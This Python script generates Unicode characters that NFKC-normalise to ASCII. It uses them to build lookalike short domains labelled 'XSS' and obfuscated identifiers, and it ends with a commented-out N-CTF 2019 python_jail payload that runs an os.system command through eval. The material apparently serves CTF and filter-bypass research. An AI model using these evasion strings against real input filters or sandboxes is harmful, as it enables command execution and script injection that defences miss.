# -*- coding: utf-8 -*-
import unicodedata
import re
import random
from itertools import product
from collections import defaultdict


def _TLD_list():
    TLDs = []
    with open("data/TLDs.txt", "r") as f:
        for line in f.readlines():
            TLDs.append(line.strip())
    return TLDs


def _unicode_list():
    unicodes = []
    with open("data/unicodes.txt", "r") as f:
        for line in f.readlines():
            unicodes.append(chr(int(line, 16)))
    return unicodes


def _is_good_domain_name(name: str):
    res = re.match("[0-9a-zA-Z_]+$", name)
    if res:
        return True


def _1toN_unicode():
    # dot in webkit is invalid
    good = defaultdict(list)
    maybe = defaultdict(list)
    unis = _unicode_list()
    for uni in unis:
        nfkc_normal = unicodedata.normalize("NFKC", uni).lower()
        if len(nfkc_normal) > 1:
            if _is_good_domain_name(nfkc_normal):
                good[nfkc_normal].append(uni)
            else:
                maybe[nfkc_normal].append(uni)
    return good, maybe


def find_funny_TLD():
    funny_TLDs = defaultdict(list)
    tlds = _TLD_list()
    unis = _unicode_list()
    for tld in tlds:
        for uni in unis:
            nfkc_normal = unicodedata.normalize("NFKC", uni).lower()
            if tld == nfkc_normal and len(nfkc_normal) > 1:
                funny_TLDs[tld].append(uni)
    for k, v in funny_TLDs.items():
        print(f"TLD: {k}===>{v}")
    return funny_TLDs


def gen_funny_domain():
    good, maybe = _1toN_unicode()
    TLDs = find_funny_TLD()
    for item in product(good.keys(), TLDs.keys()):
        real_domain = f"{item[0]}.{item[1]}"
        xss_domain = f"{random.choice(good[item[0]])}.{random.choice(TLDs[item[1]])}"
        print(f"Real: {real_domain} "
              f"===> XSS: {xss_domain} "
              f"===> Length: {len(xss_domain)}")


def gen_unicode_str(original_str):
    ch_map = defaultdict(list)
    items = [i for i in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"]
    unicodes = _unicode_list()
    for uni in unicodes:
        normal_ch = unicodedata.normalize('NFKC', uni)
        if normal_ch in items:
            ch_map[normal_ch].append(uni)

    # print("print map table:")
    # for k, v in ch_map.items():
    #     print(k, f": {len(v)} : ", v)

    items = [i for i in original_str]
    n_items = []
    for c in items:
        nc = random.choice(ch_map[c])
        n_items.append(nc)
    return "".join(n_items)


if __name__ == '__main__':
    # generate funny domains
    gen_funny_domain()
    print(gen_unicode_str('import'))
    # N-CTF 2019 python_jail
    # should run many times to find valid payload
    # code = f"__{gen_unicode_str('import')}__('os').{gen_unicode_str('system')}('whoami')"
    # eval(code)
